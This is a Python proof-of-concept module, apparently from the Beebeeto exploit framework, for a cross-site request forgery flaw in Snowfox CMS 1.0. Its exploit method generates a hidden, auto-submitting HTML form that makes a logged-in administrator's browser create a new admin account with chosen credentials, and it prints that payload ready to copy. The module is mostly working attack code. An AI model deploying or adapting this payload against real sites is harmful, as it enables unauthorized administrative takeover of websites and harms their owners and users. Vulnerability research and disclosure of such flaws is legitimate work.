#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0154',
            'name': 'Snowfox CMS 1.0 CSRF Add Admin Exploit',
            'author': 'tmp',
            'create_date': '2014-11-20',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Snowfox',
            'vul_version': ['1.0'],
            'type': 'Cross Site Request Forgery',
            'tag': ['Snowfox CMS漏洞', 'CSRF添加管理员', 'php'],
            'desc': '''
                    Snowfox CMS suffers from a cross-site request forgery vulnerabilities.
                    The application allows users to perform certain actions via HTTP requests
                    without performing any validity checks to verify the requests.
                    This can be exploited to perform certain actions with administrative privileges
                    if a logged-in user visits a malicious web site.
                    Tested on: Apache/2.4.7 (Win32)
                               PHP/5.5.6
                               MySQL 5.6.14
                    Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                    @zeroscience
                    ''',
            'references': ['http://www.exploit-db.com/exploits/35301/',
            ],
        },
    }


    @classmethod
    def exploit(cls, args):
        verify_url = args['options']['target']
        if args['options']['verbose']:
            print '[*] Generation: ' + verify_url
        temp = '''
        <div style="display: none;">
        <form action="%s/?uri=admin/accounts/create" method="POST" name="ff0000team">
          <input type="hidden" name="emailAddress" value="lab@zeroscience.mk" />
          <input type="hidden" name="verifiedEmail" value="verified" />
          <input type="hidden" name="username" value="USERNAME" />
          <input type="hidden" name="newPassword" value="PASSWORD" />
          <input type="hidden" name="confirmPassword" value="PASSWORD" />
          <input type="hidden" name="userGroups[]" value="34" />
          <input type="hidden" name="userGroups[]" value="33" />
          <input type="hidden" name="memo" value="CSRFmemo" />
          <input type="hidden" name="status" value="1" />
          <input type="hidden" name="formAction" value="submit" />
          <input type="submit" value="Submit form" />
        </form>
        </div>
        <script>
        setTimeout("document.ff0000team.submit()", 2000);
        </script>
        ''' % verify_url
        print '[*] Copy code: ' + temp
        print '[*] Specific use: ' + str(MyPoc.poc_info['vul']['references'])
        args['success'] = True
        args['poc_ret']['vul_url'] = 'Generation ok'
        return args

    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())